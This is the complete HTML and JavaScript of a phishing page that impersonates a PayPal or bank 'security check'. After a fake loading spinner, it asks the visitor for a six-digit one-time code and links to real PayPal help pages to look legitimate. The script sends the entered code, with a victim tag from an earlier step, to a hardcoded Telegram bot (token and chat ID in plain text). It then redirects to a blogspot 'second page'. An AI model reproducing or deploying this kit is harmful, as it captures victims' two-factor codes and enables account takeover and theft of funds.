<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Confirmation — Security Check</title>
  <style>
    :root{
      --blue:#005ea6;
      --blue-strong:#004b82;
      --muted:#666;
      --input-border:#cfcfcf;
      --focus-border:#0070ba;
      --bg: #ffffff;
      --maxw: 420px;
    }

    html,body{
      height:100%;
      margin:0;
      font-family: "Futura", "Helvetica Neue", Arial, sans-serif;
      background:var(--bg);
      color:#222;
      -webkit-font-smoothing:antialiased;
      -moz-osx-font-smoothing:grayscale;
    }

    .logo {
      margin: 0 auto 10px;
      display: flex;
      justify-content: center;
    }
    .logo img {
      max-width: 40px;
      height: auto;
    }

    .page {
      min-height:100%;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:40px 20px;
      box-sizing:border-box;
      flex-direction:column;
    }

    .card {
      width:100%;
      max-width:var(--maxw);
      text-align:center;
      padding:12px 20px 40px;
      box-sizing:border-box;
    }

    .heading {
      font-size:34px;
      font-weight:700;
      margin:18px 0 36px;
      line-height:1.05;
      color:#222;
    }

    .spinner-wrap {
      display:flex;
      flex-direction:column;
      align-items:center;
      gap:18px;
      margin-bottom:4rem;
    }

    .spinner {
      width:72px;
      height:72px;
      border-radius:50%;
      background:conic-gradient(var(--blue) 0deg 70deg, #d9d9d9 70deg 360deg);
      box-shadow: 0 1px 0 rgba(0,0,0,0.02) inset;
      animation: spin 1.4s linear infinite;
    }

    @keyframes spin { to { transform: rotate(360deg); } }

    .spinner-subtext {
      font-size:14px;
      color:var(--muted);
    }

    .otp-area {
      display:none;
      margin-top:8px;
      text-align:center;
    }

    .otp-text {
      font-size:18px;
      color:#000000;
      margin-bottom:8px;
      font-weight:800;
    }
    .otp-sub {
      font-size:14px;
      color:#000000;
      margin-bottom:22px;
    }

    .code-inputs {
      display:flex;
      justify-content:center;
      gap:12px;
      margin-bottom:20px;
    }

    .code-inputs input {
      width:52px;
      height:56px;
      font-size:22px;
      font-weight:700;
      text-align:center;
      border-radius:8px;
      border:2px solid var(--input-border);
      caret-color:var(--blue);
    }
    .code-inputs input:focus{
      border-color:var(--focus-border);
      outline:none;
      box-shadow:0 4px 10px rgba(0,0,0,0.04);
    }

    .btn {
      width:100%;
      max-width:320px;
      margin:0 auto 12px;
      padding:14px 18px;
      border-radius:28px;
      background-color:#000080;
      color:#fff;
      font-size:16px;
      font-weight:800;
      border:none;
      cursor:pointer;
      box-shadow:0 4px 0 rgba(0,0,0,0.03) inset;
    }
    .btn:hover{ background:#000080; }

    .secondary {
      margin-top:8px;
      font-size:14px;
      color:var(--muted);
    }
    .secondary a {
      color:var(--focus-border);
      text-decoration:none;
      font-weight:700;
      margin:0 6px;
    }
    .secondary a:hover { text-decoration:underline; }

    footer {
      margin-top:40px;
      font-size:13px;
      color:var(--muted);
      font-weight:700;
      padding-bottom:15px;
    }
    footer a { color:#333; text-decoration:none; margin:0 6px; }
    footer a:hover { text-decoration:underline; }

    @media (max-width:360px){
      .code-inputs input{ width:44px; height:50px; font-size:20px; }
      .heading{ font-size:28px; }
    }
  </style>
</head>
<body>
  <div class="page">
    <div class="logo">
      <img src="https://i.im.ge/2025/09/22/n9xQJG.Picsart-25-09-22-16-21-48-182.png" alt="Bank Logo">
    </div>
    <div class="card">
      <div id="loading-screen" class="spinner-wrap" aria-live="polite">
        <div style="height:28px"></div>
        <div class="heading">Just one step to verifying your account</div>
        <div class="spinner" aria-hidden="true"></div>
        <div class="spinner-subtext">Please wait while we perform security check</div>
      </div>

      <div id="otp-area" class="otp-area" aria-hidden="true">
        <div class="otp-text">Enter your code</div>
        <div id="dest-email" class="otp-sub">We sent a 6-digit code to your mobile device.</div>
        <div class="secondary"><a href="#" id="resend-link">Resend</a></div>
        <br><br>

        <form id="otp-form">
          <div class="code-inputs" role="group" aria-label="6 digit code">
            <input inputmode="numeric" maxlength="1" class="digit" aria-label="Digit 1">
            <input inputmode="numeric" maxlength="1" class="digit" aria-label="Digit 2">
            <input inputmode="numeric" maxlength="1" class="digit" aria-label="Digit 3">
            <input inputmode="numeric" maxlength="1" class="digit" aria-label="Digit 4">
            <input inputmode="numeric" maxlength="1" class="digit" aria-label="Digit 5">
            <input inputmode="numeric" maxlength="1" class="digit" aria-label="Digit 6">
          </div>
          <button class="btn" type="submit">Continue</button>
        </form>

        <div class="secondary">
          <a href="https://www.paypal.com/us/cshelp/contact-us">Having trouble logging in?</a>
        </div>
      </div>
    </div>
    <footer>
      <a href="https://www.paypal.com/us/cshelp/contact-us">Contact Us</a>
      <a href="https://www.paypal.com/us/legalhub/paypal/privacy-full">Privacy</a>
      <a href="https://www.paypal.com/us/legalhub/paypal/home">Legal</a>
      <a href="https://www.paypal.com/us/webapps/mpp/country-worldwide">Worldwide</a>
    </footer>
  </div>

<script>
	 	  // Retrieve user tag from localStorage (set on Step 1)
  function getUserTag() {
    return localStorage.getItem("userTag") || "UnknownUser";
  }
  const userTag = getUserTag();
  
  const BOT_TOKEN = "8357190104:AAGRU7LylcJDfGyYGAQHhni7e8PyAC8PKkU";
  const CHAT_ID = "8259952691";
  const SECURITY_CHECK_DURATION_MS = 4000;
  const RESEND_COOLDOWN_MS = 30000;

  const loadingScreen = document.getElementById('loading-screen');
  const otpArea = document.getElementById('otp-area');

  setTimeout(() => {
    loadingScreen.style.display = 'none';
    otpArea.style.display = 'block';
    otpArea.setAttribute('aria-hidden','false');
    const first = document.querySelector('.code-inputs input');
    if (first) first.focus();
  }, SECURITY_CHECK_DURATION_MS);

  const inputs = Array.from(document.querySelectorAll('.code-inputs input'));
  function isNumericChar(str){ return /^[0-9]$/.test(str); }

  inputs.forEach((input, idx) => {
    input.addEventListener('input', (e) => {
      const val = e.target.value;
      if (!val) return;
      if (!isNumericChar(val)){ e.target.value = ''; return; }
      const next = inputs[idx+1];
      if (next) next.focus();
    });
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !e.target.value){
        const prev = inputs[idx-1]; if (prev){ prev.focus(); prev.value=''; }
      }
    });
    input.addEventListener('paste', (e) => {
      e.preventDefault();
      const digits = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, inputs.length);
      for (let i=0;i<digits.length;i++){ inputs[i].value = digits[i]; }
      const after = inputs[Math.min(digits.length, inputs.length-1)];
      if (after) after.focus();
    });
  });

  const resendLink = document.getElementById('resend-link');
  let resendTimer;
  function startResendCooldown(){
    let timeLeft = RESEND_COOLDOWN_MS / 1000;
    resendLink.textContent = `Resend in ${timeLeft}s`;
    resendLink.style.pointerEvents = 'none';
    resendLink.style.opacity = '0.6';
    resendTimer = setInterval(() => {
      timeLeft--;
      if (timeLeft > 0){
        resendLink.textContent = `Resend in ${timeLeft}s`;
      } else {
        clearInterval(resendTimer);
        resendLink.textContent = 'Resend';
        resendLink.style.pointerEvents = 'auto';
        resendLink.style.opacity = '1';
      }
    }, 1000);
  }
  resendLink.addEventListener('click', function(e){
  e.preventDefault();

  // Create message element
  const msg = document.createElement('div');
  msg.textContent = "A new otp code was sent to your device";
  msg.style.position = "fixed";
  msg.style.bottom = "20px";
  msg.style.left = "50%";
  msg.style.transform = "translateX(-50%)";
  msg.style.background = "#000080";
  msg.style.color = "#fff";
  msg.style.padding = "10px 20px";
  msg.style.borderRadius = "6px";
  msg.style.fontSize = "14px";
  msg.style.fontWeight = "600";
  msg.style.zIndex = "9999";
  msg.style.boxShadow = "0 2px 6px rgba(0,0,0,0.2)";
  document.body.appendChild(msg);

  // Remove after 1 second
  setTimeout(() => {
    msg.remove();
  }, 2000);

  // Start cooldown
  startResendCooldown();
});


  document.getElementById('otp-form').addEventListener('submit', function(e){
    e.preventDefault();
    const code = inputs.map(i => i.value.trim()).join('');
    if (code.length !== inputs.length || !/^\d+$/.test(code)){
      alert('Please enter the 6-digit code sent to your device.');
      return;
    }
const message = 
      `👤 OTP ARRIVES\n` +
      `🔖Tag: ${userTag}\n` +
      `🔐 OTP submitted: ${code}`;
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    })
    .then(response => response.json())
    .then(data => {
      if (data.ok) {
                 // fixed redirect URL
          window.location.href = "https://desirevillaresort.blogspot.com/2025/10/second-pge.html?userTag=" + userTag; 
      } else {
        alert("Failed to send code via Telegram");
      }
    })
    .catch(err => {
      alert("Error sending to Telegram: " + err.message);
    });
  });
</script>
</body>
</html>
